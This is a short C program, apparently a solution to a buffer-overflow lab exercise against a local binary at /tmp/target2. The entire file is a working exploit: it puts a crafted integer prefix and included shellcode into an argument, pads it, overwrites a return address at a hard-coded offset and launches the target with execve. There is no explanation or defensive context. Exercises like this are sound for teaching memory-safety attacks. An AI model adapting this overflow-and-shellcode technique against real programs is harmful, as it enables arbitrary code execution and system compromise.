#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	char arg1[7008]="-134217509,";
	strcat(arg1,shellcode);
	memset(arg1 +strlen(arg1), 'A', sizeof(arg1)-strlen(arg1));
	//fprintf(stdout,"%s\n",arg1);
	*((unsigned*)(&arg1[6543])) = 0xbeffc8d8;
	arg1[7007]=0;
	//6536
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
